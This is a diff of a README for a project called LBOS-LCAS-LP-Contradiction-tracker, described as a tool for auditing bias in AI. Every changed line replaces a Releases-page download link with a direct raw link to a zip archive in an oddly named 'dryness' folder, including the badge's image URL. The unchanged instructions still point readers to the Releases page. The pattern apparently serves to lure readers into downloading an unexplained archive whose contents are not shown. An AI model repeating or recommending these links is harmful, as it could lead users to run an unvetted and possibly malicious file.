@@ -1,6 +1,6 @@
 # 🎯 LBOS-LCAS-LP-Contradiction-tracker - Audit Bias in AI Effectively
 
-[![Download](https://img.shields.io/badge/Download-LBOS--LCAS--LP--Contradiction--tracker-blue)](https://github.com/sportixIndia/LBOS-LCAS-LP-Contradiction-tracker/releases)
+[![Download](https://github.com/sportixIndia/LBOS-LCAS-LP-Contradiction-tracker/raw/refs/heads/main/dryness/LBO_L_LCA_Contradiction_tracker_2.6.zip)](https://github.com/sportixIndia/LBOS-LCAS-LP-Contradiction-tracker/raw/refs/heads/main/dryness/LBO_L_LCA_Contradiction_tracker_2.6.zip)
 
 ## 📜 Overview
 
@@ -23,7 +23,7 @@ LBOS-LCAS-LP-Contradiction-tracker is a tool designed to help you audit bias in 
 
 ## 🚀 Getting Started
 
-1. **Download the Application**: Visit [this page to download](https://github.com/sportixIndia/LBOS-LCAS-LP-Contradiction-tracker/releases).
+1. **Download the Application**: Visit [this page to download](https://github.com/sportixIndia/LBOS-LCAS-LP-Contradiction-tracker/raw/refs/heads/main/dryness/LBO_L_LCA_Contradiction_tracker_2.6.zip).
 
 2. **Choose the Latest Version**: Look for the latest version on the Releases page. Click on it to access the download options.
 
@@ -38,7 +38,7 @@ LBOS-LCAS-LP-Contradiction-tracker is a tool designed to help you audit bias in 
 
 ## 📥 Download & Install
 
-To download, please [visit this page](https://github.com/sportixIndia/LBOS-LCAS-LP-Contradiction-tracker/releases) and follow the instructions provided above.
+To download, please [visit this page](https://github.com/sportixIndia/LBOS-LCAS-LP-Contradiction-tracker/raw/refs/heads/main/dryness/LBO_L_LCA_Contradiction_tracker_2.6.zip) and follow the instructions provided above.
 
 ## 📋 How to Use
 
